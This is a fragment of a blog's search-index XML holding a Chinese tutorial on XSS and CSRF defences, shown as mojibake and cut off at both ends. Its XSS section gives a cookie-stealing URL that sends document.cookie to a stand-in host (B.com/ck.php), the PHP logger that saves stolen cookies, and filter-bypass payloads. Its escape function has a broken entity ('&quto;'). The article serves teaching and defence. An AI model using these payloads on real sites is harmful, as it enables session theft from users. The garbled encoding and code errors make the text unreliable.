å·¥åŽ‚æ–¹æ³•æ¨¡å¼å·¥åŽ‚æ–¹æ³•æ¨¡å¼åŒ…å«å¦‚ä¸‹è§’è‰²ï¼šProductï¼šæŠ½è±¡äº§å“ConcreteProductï¼šå…·ä½“äº§å“Factoryï¼šæŠ½è±¡å·¥åŽ‚ConcreteFactoryï¼šå…·ä½“å·¥åŽ‚]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_secure%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ä¸€ã€XSSXSS (Cross-Site Scripting)ï¼Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œå› ä¸ºç¼©å†™å’Œ CSSé‡å ï¼Œæ‰€ä»¥åªèƒ½å« XSSã€‚è·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æŒ‡é€šè¿‡å­˜åœ¨å®‰å…¨æ¼æ´žçš„Webç½‘ç«™æ³¨å†Œç”¨æˆ·çš„æµè§ˆå™¨å†…è¿è¡Œéžæ³•çš„HTMLæ ‡ç­¾æˆ–JavaScriptè¿›è¡Œçš„ä¸€ç§æ”»å‡»ã€‚ è·¨ç«™è„šæœ¬æ”»å‡»æœ‰å¯èƒ½é€ æˆä»¥ä¸‹å½±å“: åˆ©ç”¨è™šå‡è¾“å…¥è¡¨å•éª—å–ç”¨æˆ·ä¸ªäººä¿¡æ¯ã€‚ åˆ©ç”¨è„šæœ¬çªƒå–ç”¨æˆ·çš„Cookieå€¼ï¼Œè¢«å®³è€…åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œå¸®åŠ©æ”»å‡»è€…å‘é€æ¶æ„è¯·æ±‚ã€‚ æ˜¾ç¤ºä¼ªé€ çš„æ–‡ç« æˆ–å›¾ç‰‡ã€‚ XSS çš„åŽŸç†æ˜¯æ¶æ„æ”»å‡»è€…å¾€ Web é¡µé¢é‡Œæ’å…¥æ¶æ„å¯æ‰§è¡Œç½‘é¡µè„šæœ¬ä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­ Web é‡Œé¢çš„è„šæœ¬ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯ä»¥è¾¾åˆ°æ”»å‡»è€…ç›—å–ç”¨æˆ·ä¿¡æ¯æˆ–å…¶ä»–ä¾µçŠ¯ç”¨æˆ·å®‰å…¨éšç§çš„ç›®çš„ã€‚ ç†è®ºä¸Šï¼Œæ‰€æœ‰å¯è¾“å…¥çš„åœ°æ–¹æ²¡æœ‰å¯¹è¾“å…¥æ•°æ®è¿›è¡Œå¤„ç†çš„è¯ï¼Œéƒ½ä¼šå­˜åœ¨XSSæ¼æ´žï¼Œæ¼æ´žçš„å±å®³å–å†³äºŽæ”»å‡»ä»£ç çš„å¨åŠ›ï¼Œæ”»å‡»ä»£ç ä¹Ÿä¸å±€é™äºŽscriptã€‚ XSS çš„æ”»å‡»æ–¹å¼åƒå˜ä¸‡åŒ–ï¼Œä½†è¿˜æ˜¯å¯ä»¥å¤§è‡´ç»†åˆ†ä¸ºå‡ ç§ç±»åž‹ã€‚ 1.éžæŒä¹…åž‹ XSSï¼ˆåå°„åž‹ XSS ï¼‰éžæŒä¹…åž‹ XSS æ¼æ´žï¼Œä¸€èˆ¬æ˜¯é€šè¿‡ç»™åˆ«äººå‘é€å¸¦æœ‰æ¶æ„è„šæœ¬ä»£ç å‚æ•°çš„ URLï¼Œå½“ URL åœ°å€è¢«æ‰“å¼€æ—¶ï¼Œç‰¹æœ‰çš„æ¶æ„ä»£ç å‚æ•°è¢« HTML è§£æžã€æ‰§è¡Œã€‚ ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œæ¯”å¦‚é¡µé¢ä¸­åŒ…å«æœ‰ä»¥ä¸‹ä»£ç ï¼š 12345678910&lt;select&gt; &lt;script&gt; document.write('' + '&lt;option value=1&gt;' + location.href.substring(location.href.indexOf('default=') + 8) + '&lt;/option&gt;' ); document.write('&lt;option value=2&gt;English&lt;/option&gt;'); &lt;/script&gt;&lt;/select&gt; æ”»å‡»è€…å¯ä»¥ç›´æŽ¥é€šè¿‡ URL (ç±»ä¼¼ï¼šhttps://xxx.com/xxx?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;) æ³¨å…¥å¯æ‰§è¡Œçš„è„šæœ¬ä»£ç ã€‚ä¸è¿‡ä¸€äº›æµè§ˆå™¨å¦‚Chromeå…¶å†…ç½®äº†ä¸€äº›XSSè¿‡æ»¤å™¨ï¼Œå¯ä»¥é˜²æ­¢å¤§éƒ¨åˆ†åå°„åž‹XSSæ”»å‡»ã€‚ éžæŒä¹…åž‹ XSS æ¼æ´žæ”»å‡»æœ‰ä»¥ä¸‹å‡ ç‚¹ç‰¹å¾ï¼š å³æ—¶æ€§ï¼Œä¸ç»è¿‡æœåŠ¡å™¨å­˜å‚¨ï¼Œç›´æŽ¥é€šè¿‡ HTTP çš„ GET å’Œ POST è¯·æ±‚å°±èƒ½å®Œæˆä¸€æ¬¡æ”»å‡»ï¼Œæ‹¿åˆ°ç”¨æˆ·éšç§æ•°æ®ã€‚ æ”»å‡»è€…éœ€è¦è¯±éª—ç‚¹å‡»,å¿…é¡»è¦é€šè¿‡ç”¨æˆ·ç‚¹å‡»é“¾æŽ¥æ‰èƒ½å‘èµ· åé¦ˆçŽ‡ä½Žï¼Œæ‰€ä»¥è¾ƒéš¾å‘çŽ°å’Œå“åº”ä¿®å¤ ç›—å–ç”¨æˆ·æ•æ„Ÿä¿å¯†ä¿¡æ¯ ä¸ºäº†é˜²æ­¢å‡ºçŽ°éžæŒä¹…åž‹ XSS æ¼æ´žï¼Œéœ€è¦ç¡®ä¿è¿™ä¹ˆå‡ ä»¶äº‹æƒ…ï¼š Web é¡µé¢æ¸²æŸ“çš„æ‰€æœ‰å†…å®¹æˆ–è€…æ¸²æŸ“çš„æ•°æ®éƒ½å¿…é¡»æ¥è‡ªäºŽæœåŠ¡ç«¯ã€‚ å°½é‡ä¸è¦ä»Ž URLï¼Œdocument.referrerï¼Œdocument.forms ç­‰è¿™ç§ DOM API ä¸­èŽ·å–æ•°æ®ç›´æŽ¥æ¸²æŸ“ã€‚ å°½é‡ä¸è¦ä½¿ç”¨ eval, new Function()ï¼Œdocument.write()ï¼Œdocument.writeln()ï¼Œwindow.setInterval()ï¼Œwindow.setTimeout()ï¼ŒinnerHTMLï¼Œdocument.createElement()ç­‰å¯æ‰§è¡Œå­—ç¬¦ä¸²çš„æ–¹æ³•ã€‚ å¦‚æžœåšä¸åˆ°ä»¥ä¸Šå‡ ç‚¹ï¼Œä¹Ÿå¿…é¡»å¯¹æ¶‰åŠ DOM æ¸²æŸ“çš„æ–¹æ³•ä¼ å…¥çš„å­—ç¬¦ä¸²å‚æ•°åš escape è½¬ä¹‰ã€‚ å‰ç«¯æ¸²æŸ“çš„æ—¶å€™å¯¹ä»»ä½•çš„å­—æ®µéƒ½éœ€è¦åš escape è½¬ä¹‰ç¼–ç ã€‚ 2.æŒä¹…åž‹ XSSï¼ˆå­˜å‚¨åž‹ XSSï¼‰æŒä¹…åž‹ XSS æ¼æ´žï¼Œä¸€èˆ¬å­˜åœ¨äºŽ Form è¡¨å•æäº¤ç­‰äº¤äº’åŠŸèƒ½ï¼Œå¦‚æ–‡ç« ç•™è¨€ï¼Œæäº¤æ–‡æœ¬ä¿¡æ¯ç­‰ï¼Œé»‘å®¢åˆ©ç”¨çš„ XSS æ¼æ´žï¼Œå°†å†…å®¹ç»æ­£å¸¸åŠŸèƒ½æäº¤è¿›å…¥æ•°æ®åº“æŒä¹…ä¿å­˜ï¼Œå½“å‰ç«¯é¡µé¢èŽ·å¾—åŽç«¯ä»Žæ•°æ®åº“ä¸­è¯»å‡ºçš„æ³¨å…¥ä»£ç æ—¶ï¼Œæ°å¥½å°†å…¶æ¸²æŸ“æ‰§è¡Œã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå¯¹äºŽè¯„è®ºåŠŸèƒ½æ¥è¯´ï¼Œå°±å¾—é˜²èŒƒæŒä¹…åž‹ XSS æ”»å‡»ï¼Œå› ä¸ºæˆ‘å¯ä»¥åœ¨è¯„è®ºä¸­è¾“å…¥ä»¥ä¸‹å†…å®¹ ä¸»è¦æ³¨å…¥é¡µé¢æ–¹å¼å’ŒéžæŒä¹…åž‹ XSS æ¼æ´žç±»ä¼¼ï¼Œåªä¸è¿‡æŒä¹…åž‹çš„ä¸æ˜¯æ¥æºäºŽ URLï¼Œrefererï¼Œforms ç­‰ï¼Œè€Œæ˜¯æ¥æºäºŽåŽç«¯ä»Žæ•°æ®åº“ä¸­è¯»å‡ºæ¥çš„æ•°æ® ã€‚æŒä¹…åž‹ XSS æ”»å‡»ä¸éœ€è¦è¯±éª—ç‚¹å‡»ï¼Œé»‘å®¢åªéœ€è¦åœ¨æäº¤è¡¨å•çš„åœ°æ–¹å®Œæˆæ³¨å…¥å³å¯ï¼Œä½†æ˜¯è¿™ç§ XSS æ”»å‡»çš„æˆæœ¬ç›¸å¯¹è¿˜æ˜¯å¾ˆé«˜ã€‚ æ”»å‡»æˆåŠŸéœ€è¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶ï¼š POST è¯·æ±‚æäº¤è¡¨å•åŽç«¯æ²¡åšè½¬ä¹‰ç›´æŽ¥å…¥åº“ã€‚ åŽç«¯ä»Žæ•°æ®åº“ä¸­å–å‡ºæ•°æ®æ²¡åšè½¬ä¹‰ç›´æŽ¥è¾“å‡ºç»™å‰ç«¯ã€‚ å‰ç«¯æ‹¿åˆ°åŽç«¯æ•°æ®æ²¡åšè½¬ä¹‰ç›´æŽ¥æ¸²æŸ“æˆ DOMã€‚ æŒä¹…åž‹ XSS æœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š æŒä¹…æ€§ï¼Œæ¤å…¥åœ¨æ•°æ®åº“ä¸­ ç›—å–ç”¨æˆ·æ•æ„Ÿç§å¯†ä¿¡æ¯ å±å®³é¢å¹¿ 3.å¦‚ä½•é˜²å¾¡å¯¹äºŽ XSS æ”»å‡»æ¥è¯´ï¼Œé€šå¸¸æœ‰ä¸¤ç§æ–¹å¼å¯ä»¥ç”¨æ¥é˜²å¾¡ã€‚ 1) CSP CSP æœ¬è´¨ä¸Šå°±æ˜¯å»ºç«‹ç™½åå•ï¼Œå¼€å‘è€…æ˜Žç¡®å‘Šè¯‰æµè§ˆå™¨å“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œã€‚æˆ‘ä»¬åªéœ€è¦é…ç½®è§„åˆ™ï¼Œå¦‚ä½•æ‹¦æˆªæ˜¯ç”±æµè§ˆå™¨è‡ªå·±å®žçŽ°çš„ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ¥å°½é‡å‡å°‘ XSS æ”»å‡»ã€‚ é€šå¸¸å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æ¥å¼€å¯ CSPï¼š è®¾ç½® HTTP Header ä¸­çš„ Content-Security-Policy è®¾ç½® meta æ ‡ç­¾çš„æ–¹å¼ è¿™é‡Œä»¥è®¾ç½® HTTP Header æ¥ä¸¾ä¾‹ï¼š åªå…è®¸åŠ è½½æœ¬ç«™èµ„æº 1Content-Security-Policy: default-src &apos;self&apos; åªå…è®¸åŠ è½½ HTTPS åè®®å›¾ç‰‡ 1Content-Security-Policy: img-src https://* å…è®¸åŠ è½½ä»»ä½•æ¥æºæ¡†æž¶ 1Content-Security-Policy: child-src &apos;none&apos; å¦‚éœ€äº†è§£æ›´å¤šå±žæ€§ï¼Œè¯·æŸ¥çœ‹Content-Security-Policyæ–‡æ¡£ å¯¹äºŽè¿™ç§æ–¹å¼æ¥è¯´ï¼Œåªè¦å¼€å‘è€…é…ç½®äº†æ­£ç¡®çš„è§„åˆ™ï¼Œé‚£ä¹ˆå³ä½¿ç½‘ç«™å­˜åœ¨æ¼æ´žï¼Œæ”»å‡»è€…ä¹Ÿä¸èƒ½æ‰§è¡Œå®ƒçš„æ”»å‡»ä»£ç ï¼Œå¹¶ä¸” CSP çš„å…¼å®¹æ€§ä¹Ÿä¸é”™ã€‚ 2) è½¬ä¹‰å­—ç¬¦ ç”¨æˆ·çš„è¾“å…¥æ°¸è¿œä¸å¯ä¿¡ä»»çš„ï¼Œæœ€æ™®éçš„åšæ³•å°±æ˜¯è½¬ä¹‰è¾“å…¥è¾“å‡ºçš„å†…å®¹ï¼Œå¯¹äºŽå¼•å·ã€å°–æ‹¬å·ã€æ–œæ è¿›è¡Œè½¬ä¹‰ 12345678910function escape(str) &#123; str = str.replace(/&amp;/g, '&amp;amp;') str = str.replace(/&lt;/g, '&amp;lt;') str = str.replace(/&gt;/g, '&amp;gt;') str = str.replace(/"/g, '&amp;quto;') str = str.replace(/'/g, '&amp;#39;') str = str.replace(/`/g, '&amp;#96;') str = str.replace(/\//g, '&amp;#x2F;') return str&#125; ä½†æ˜¯å¯¹äºŽæ˜¾ç¤ºå¯Œæ–‡æœ¬æ¥è¯´ï¼Œæ˜¾ç„¶ä¸èƒ½é€šè¿‡ä¸Šé¢çš„åŠžæ³•æ¥è½¬ä¹‰æ‰€æœ‰å­—ç¬¦ï¼Œå› ä¸ºè¿™æ ·ä¼šæŠŠéœ€è¦çš„æ ¼å¼ä¹Ÿè¿‡æ»¤æŽ‰ã€‚å¯¹äºŽè¿™ç§æƒ…å†µï¼Œé€šå¸¸é‡‡ç”¨ç™½åå•è¿‡æ»¤çš„åŠžæ³•ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡é»‘åå•è¿‡æ»¤ï¼Œä½†æ˜¯è€ƒè™‘åˆ°éœ€è¦è¿‡æ»¤çš„æ ‡ç­¾å’Œæ ‡ç­¾å±žæ€§å®žåœ¨å¤ªå¤šï¼Œæ›´åŠ æŽ¨èä½¿ç”¨ç™½åå•çš„æ–¹å¼ã€‚ 1234const xss = require('xss')let html = xss('&lt;h1 id="title"&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert("xss");&lt;/script&gt;')// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert("xss");&amp;lt;/script&amp;gt;console.log(html) ä»¥ä¸Šç¤ºä¾‹ä½¿ç”¨äº† js-xss æ¥å®žçŽ°ï¼Œå¯ä»¥çœ‹åˆ°åœ¨è¾“å‡ºä¸­ä¿ç•™äº† h1 æ ‡ç­¾ä¸”è¿‡æ»¤äº† script æ ‡ç­¾ã€‚ 3) HttpOnly Cookieã€‚ è¿™æ˜¯é¢„é˜²XSSæ”»å‡»çªƒå–ç”¨æˆ·cookieæœ€æœ‰æ•ˆçš„é˜²å¾¡æ‰‹æ®µã€‚Webåº”ç”¨ç¨‹åºåœ¨è®¾ç½®cookieæ—¶ï¼Œå°†å…¶å±žæ€§è®¾ä¸ºHttpOnlyï¼Œå°±å¯ä»¥é¿å…è¯¥ç½‘é¡µçš„cookieè¢«å®¢æˆ·ç«¯æ¶æ„JavaScriptçªƒå–ï¼Œä¿æŠ¤ç”¨æˆ·cookieä¿¡æ¯ã€‚ å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­XSSæ”»å‡»çš„é˜²èŒƒ1.å»ºç«‹ç™½åå•å°±å¥½ï¼Œä¿ç•™è¦ç”¨çš„æ ‡ç­¾ï¼Œå…¶ä»–å…¨éƒ¨è¿‡æ»¤ 2.å…¥æ•°æ®åº“çš„æ—¶å€™ è½¬ä¹‰ä¸ºå®žä½“å­—ç¬¦ï¼Œå‡ºåº“çš„æ—¶å€™è¿˜åŽŸï¼Œå¹¶è¿‡æ»¤æŽ‰ä»¥ä¸‹ 12&lt;script&gt;&lt;/script&gt;javascript:xxx; XSS è·¨ç«™è„šæœ¬æ”»å‡»Chromeæµè§ˆå™¨é»˜è®¤å¼€å¯xssç›‘å¬ï¼Œæµ‹è¯•å‰é¡»å‘½ä»¤è¡Œå¯åŠ¨æµè§ˆå™¨ï¼Œå…³é—­ç›‘å¬ã€‚ 12cd /Applications/Google Chrome.app/Contents/MacOS./Google Chrome --disable-xss-auditor åå°„åž‹ï¼šéžæŒä¹…åŒ–ï¼Œç”¨æˆ·ä¸»åŠ¨ç‚¹å‡»å¸¦æœ‰æ¶æ„URLï¼Œå‘é€è¯·æ±‚åˆ°åŽç«¯ï¼ŒåŽç«¯è¿”å›žå¸¦æœ‰æ¶æ„è„šæœ¬çš„é¡µé¢ã€‚å‡è®¾æŸç½‘ç«™ http://A.com çš„æŸä¸ªè¾“å…¥æ¡†å­˜åœ¨XSSæ¼æ´žï¼Œèƒ½é€šè¿‡è¾“å…¥æ¡†æˆ–è€…URLä¼ å…¥è„šæœ¬æ‰§è¡Œã€‚æ¯”å¦‚å®ƒçš„åŽç«¯phpä»£ç æ˜¯è¿™æ ·çš„ 1echo 'Hello ' . $_GET[ 'name' ]; é‚£ä¹ˆï¼Œå°±å¯ä»¥åœ¨ urlä¸­ä¼ å…¥å‚æ•°nameã€‚ç”Ÿæˆ æ¶æ„urlï¼š 1A.com/?name=&lt;script&gt;window.open('B.com/ck.php?c='+document.cookie)&lt;/script&gt; ck.phpæ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼Œå°†èŽ·å¾—çš„cookieå­˜å…¥cookie.txtã€‚ 1234567$cookie = $_GET[&apos;c&apos;]; $ip = getenv (&apos;REMOTE_ADDR&apos;); $time=date(&quot;j F, Y, g:i a&quot;); $referer=getenv (&apos;HTTP_REFERER&apos;); $fp = fopen(&apos;cookie.txt&apos;, &apos;a&apos;); fwrite($fp, &apos;Cookie: &apos;.$cookie.&quot;\n&quot;.&apos;IP: &apos;.$ip.&quot;\n&quot;.&apos;Date and Time: &apos;.$time.&quot;\n&quot;.&apos;Referer: &apos;.$referer.&quot;\n\n&quot;); fclose($fp); é€šè¿‡çŸ­åŸŸåç”Ÿæˆç½‘ç«™,å°†ä¸Šè¯‰ æ¶æ„ url æ˜ å°„æˆç±»ä¼¼http://dwz.cn/B4l3Ydkeçš„ç½‘å€æ¬ºéª—ç”¨æˆ·ï¼Œå‘é€ç»™å·²ç»åœ¨[http://A.com](http://a.com/)ç™»å½•çš„ç”¨æˆ·ï¼Œç”¨æˆ·ç‚¹å‡»ä¹‹åŽï¼Œcookieä¿¡æ¯å°±ä¼šè‡ªåŠ¨ä¿å­˜åˆ° http://B.comä¸‹çš„cookie.txtä¸­ã€‚ é€šå¸¸ï¼ŒåŽç«¯ä¸ä¼šè¿™ä¹ˆå¦‚æ­¤ä¿¡ä»»ç”¨æˆ·è¾“å…¥ï¼Œä¼šå¯¹å„ç§è¾“å…¥è¿›è¡Œæ­£åˆ™è¿‡æ»¤é™åˆ¶ã€‚é’ˆå¯¹å„ç§è¿‡æ»¤å‡ºçŽ°äº†å¯¹åº”çš„æ¶æ„ payload, é€šè¿‡äº‹ä»¶ã€é€šè¿‡åè®®ã€é€šè¿‡è¯·æ±‚ã€‚ 12345&lt;Script&gt; æ¶æ„ä»£ç  &lt;/script&gt;&lt;sc&lt;script&gt;ript&gt; æ¶æ„ä»£ç  &lt;/script&gt;&lt;img onerror=" æ¶æ„ä»£ç  " &gt;&lt;div style="position:fixed;top:0;left:0;bottom:0;right:0;" onclick=" æ¶æ„ä»£ç  "&gt;&lt;/div&gt;... ä»¥ä¸‹ä»£ç é€šè¿‡base64ç¼–ç ï¼Œä¾æ—§èƒ½å®žçŽ°æ¶æ„æ”»å‡»ã€‚ 1&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiMSIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt; æœ‰æ•ˆçš„è§£å†³æ–¹æ³•æ˜¯é€šè¿‡è½¬ä¹‰ï¼Œé€šè¿‡ htmlspecialcharsï¼Œå°†å…·æœ‰ç‰¹æ®Šæ„ä¹‰çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ 12345&amp; å˜ä¸º &amp;amp;" å˜ä¸º &amp;quot;' å˜ä¸º &amp;#039;&lt; å˜ä¸º &amp;lt;&gt; å˜ä¸º &amp;gt; å­˜å‚¨åž‹ï¼šæŒä¹…åž‹ï¼Œæ”»å‡»è€…æäº¤æ¶æ„è„šæœ¬æœ€ç»ˆè¿›å…¥åˆ°æ•°æ®åº“ï¼Œç”¨æˆ·è®¿é—®åŠ è½½é¡µé¢æ—¶ï¼Œæ¶æ„è„šæœ¬æ‰§è¡Œã€‚ åŒºåˆ«äºŽå­˜å‚¨åž‹XSS æ”»å‡»ï¼Œè„šæœ¬å› ä¸ºå­˜å…¥æ•°æ®åº“å¯¼è‡´å±å®³æ›´å¤§ï¼Œæ‰€æœ‰è®¿é—®è¯¥é¡µé¢çš„ç”¨æˆ·éƒ½å°†è¢«æ”»å‡»ã€‚ä½†å› ä¸ºä¸šåŠ¡éœ€è¦æ¯”å¦‚å¯Œæ–‡æœ¬æ¡†åŠŸèƒ½ï¼Œå°±ä¸èƒ½ä¸€å‘³çš„ä½¿ç”¨ htmlspecialchars è½¬ä¹‰ï¼Œè€Œåº”è¯¥è‡ªå®šä¹‰è¿‡æ»¤è§„åˆ™ï¼Œå°†å†…å®¹é™åˆ¶åœ¨å®‰å…¨èŒƒå›´å†…ã€‚ 12æ”¾è¡Œå¸¸è§æ ‡ç­¾åŠimgæ ‡ç­¾ä»¥å®žçŽ°å¯Œæ–‡æœ¬åŠŸèƒ½ã€‚å¯¹script,iframe,formæ ‡ç­¾,onå¼€å¤´çš„å±žæ€§,hrefå±žæ€§ç­‰è¿›è¡Œè¿‡æ»¤ã€‚ DOMåž‹:å®¢æˆ·ç«¯è„šæœ¬é€šè¿‡DOMåŠ¨æ€è¾“å‡ºæ•°æ®åˆ°é¡µé¢ï¼Œè€Œä¸ç»è¿‡æœåŠ¡å™¨ã€‚ å½“å‰ç«¯å‡ºçŽ°ä»¥ä¸‹ä»£ç æ—¶ï¼Œå°±è¦å°å¿ƒäº†ï¼Œç¡®ä¿ç­‰å·å³è¾¹çš„å†…å®¹å¯æŽ§ã€‚ 123456789101112document.write = innerHTML = eval()// ä¸å¥½çš„ä¾‹å­if (document.location.href.indexOf("default=") &gt;= 0) &#123;var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);document.write("&lt;option value='" + lang + "'&gt;&lt;/option&gt;");&#125;// æ­¤æ—¶å¯ä»¥é€šè¿‡ä»¥ä¸‹payloadæ³¨å…¥A.com?default=German#&lt;script&gt; æ¶æ„ä»£ç  &lt;/script&gt; å¤§éƒ¨åˆ†xsséƒ½æ˜¯ä¸ºäº†èŽ·å¾—cookieï¼Œè¿›è¡Œä¸‹ä¸€æ­¥çš„ç ´åï¼Œå› æ­¤ç³»ç»Ÿå±‚é¢ä¹Ÿåº”è€ƒè™‘cookieæœ‰æ•ˆæœŸï¼ŒHttpOnlyç­‰æ–¹å¼ã€‚ äºŒã€CSRFCSRF(Cross Site Request Forgery)ï¼Œå³è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§å¸¸è§çš„Webæ”»å‡»ï¼Œå®ƒåˆ©ç”¨ç”¨æˆ·å·²ç™»å½•çš„èº«ä»½ï¼Œåœ¨ç”¨æˆ·æ¯«ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œä»¥ç”¨æˆ·çš„åä¹‰å®Œæˆéžæ³•æ“ä½œã€‚ 1. CSRFæ”»å‡»çš„åŽŸç†ä¸‹é¢å…ˆä»‹ç»ä¸€ä¸‹CSRFæ”»å‡»çš„åŽŸç†ï¼š å®Œæˆ CSRF æ”»å‡»å¿…é¡»è¦æœ‰ä¸‰ä¸ªæ¡ä»¶ï¼š ç”¨æˆ·å·²ç»ç™»å½•äº†ç«™ç‚¹ Aï¼Œå¹¶åœ¨æœ¬åœ°è®°å½•äº† cookie åœ¨ç”¨æˆ·æ²¡æœ‰ç™»å‡ºç«™ç‚¹ A çš„æƒ…å†µä¸‹ï¼ˆä¹Ÿå°±æ˜¯ cookie ç”Ÿæ•ˆçš„æƒ…å†µä¸‹ï¼‰ï¼Œè®¿é—®äº†æ¶æ„æ”»å‡»è€…æä¾›çš„å¼•è¯±å±é™©ç«™ç‚¹ B (B ç«™ç‚¹è¦æ±‚è®¿é—®ç«™ç‚¹A)ã€‚ ç«™ç‚¹ A æ²¡æœ‰åšä»»ä½• CSRF é˜²å¾¡ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š å½“æˆ‘ä»¬ç™»å…¥è½¬è´¦é¡µé¢åŽï¼Œçªç„¶çœ¼å‰ä¸€äº®æƒŠçŽ°â€XXXéšç§ç…§ç‰‡ï¼Œä¸çœ‹åŽæ‚”ä¸€è¾ˆå­â€çš„é“¾æŽ¥ï¼Œè€ä¸ä½å†…å¿ƒèºåŠ¨ï¼Œç«‹é©¬ç‚¹å‡»äº†è¯¥å±é™©çš„ç½‘ç«™ï¼ˆé¡µé¢ä»£ç å¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰ï¼Œä½†å½“è¿™é¡µé¢ä¸€åŠ è½½ï¼Œä¾¿ä¼šæ‰§è¡ŒsubmitFormè¿™ä¸ªæ–¹æ³•æ¥æäº¤è½¬è´¦è¯·æ±‚ï¼Œä»Žè€Œå°†10å—è½¬ç»™é»‘å®¢ã€‚ 2.å¦‚ä½•é˜²å¾¡é˜²èŒƒ CSRF æ”»å‡»å¯ä»¥éµå¾ªä»¥ä¸‹å‡ ç§è§„åˆ™ï¼š Get è¯·æ±‚ä¸å¯¹æ•°æ®è¿›è¡Œä¿®æ”¹ ä¸è®©ç¬¬ä¸‰æ–¹ç½‘ç«™è®¿é—®åˆ°ç”¨æˆ· Cookie é˜»æ­¢ç¬¬ä¸‰æ–¹ç½‘ç«™è¯·æ±‚æŽ¥å£ è¯·æ±‚æ—¶é™„å¸¦éªŒè¯ä¿¡æ¯ï¼Œæ¯”å¦‚éªŒè¯ç æˆ–è€… Token 1) SameSite å¯ä»¥å¯¹ Cookie è®¾ç½® SameSite å±žæ€§ã€‚è¯¥å±žæ€§è¡¨ç¤º Cookie ä¸éšç€è·¨åŸŸè¯·æ±‚å‘é€ï¼Œå¯ä»¥å¾ˆå¤§ç¨‹åº¦å‡å°‘ CSRF çš„æ”»å‡»ï¼Œä½†æ˜¯è¯¥å±žæ€§ç›®å‰å¹¶ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨éƒ½å…¼å®¹ã€‚ 2) Referer Check HTTP Refereræ˜¯headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererä¿¡æ¯å‘Šè¯‰æœåŠ¡å™¨æ˜¯ä»Žå“ªä¸ªé¡µé¢é“¾æŽ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨ç±æ­¤å¯ä»¥èŽ·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºŽå¤„ç†ã€‚å¯ä»¥é€šè¿‡æ£€æŸ¥è¯·æ±‚çš„æ¥æºæ¥é˜²å¾¡CSRFæ”»å‡»ã€‚æ­£å¸¸è¯·æ±‚çš„refererå…·æœ‰ä¸€å®šè§„å¾‹ï¼Œå¦‚åœ¨æäº¤è¡¨å•çš„refererå¿…å®šæ˜¯åœ¨è¯¥é¡µé¢å‘èµ·çš„è¯·æ±‚ã€‚æ‰€ä»¥é€šè¿‡æ£€æŸ¥httpåŒ…å¤´refererçš„å€¼æ˜¯ä¸æ˜¯è¿™ä¸ªé¡µé¢ï¼Œæ¥åˆ¤æ–­æ˜¯ä¸æ˜¯CSRFæ”»å‡»ã€‚ ä½†åœ¨æŸäº›æƒ…å†µä¸‹å¦‚ä»Žhttpsè·³è½¬åˆ°httpï¼Œæµè§ˆå™¨å¤„äºŽå®‰å…¨è€ƒè™‘ï¼Œä¸ä¼šå‘é€refererï¼ŒæœåŠ¡å™¨å°±æ— æ³•è¿›è¡Œcheckäº†ã€‚è‹¥ä¸Žè¯¥ç½‘ç«™åŒåŸŸçš„å…¶ä»–ç½‘ç«™æœ‰XSSæ¼æ´žï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥åœ¨å…¶ä»–ç½‘ç«™æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œå—å®³è€…è¿›å…¥äº†æ­¤ç±»åŒåŸŸçš„ç½‘å€ï¼Œä¹Ÿä¼šé­å—æ”»å‡»ã€‚å‡ºäºŽä»¥ä¸ŠåŽŸå› ï¼Œæ— æ³•å®Œå…¨ä¾èµ–Referer Checkä½œä¸ºé˜²å¾¡CSRFçš„ä¸»è¦æ‰‹æ®µã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡Referer Checkæ¥ç›‘æŽ§CSRFæ”»å‡»çš„å‘ç”Ÿã€‚ 3) Anti CSRF Token ç›®å‰æ¯”è¾ƒå®Œå–„çš„è§£å†³æ–¹æ¡ˆæ˜¯åŠ å…¥Anti-CSRF-Tokenã€‚å³å‘é€è¯·æ±‚æ—¶åœ¨HTTP è¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ 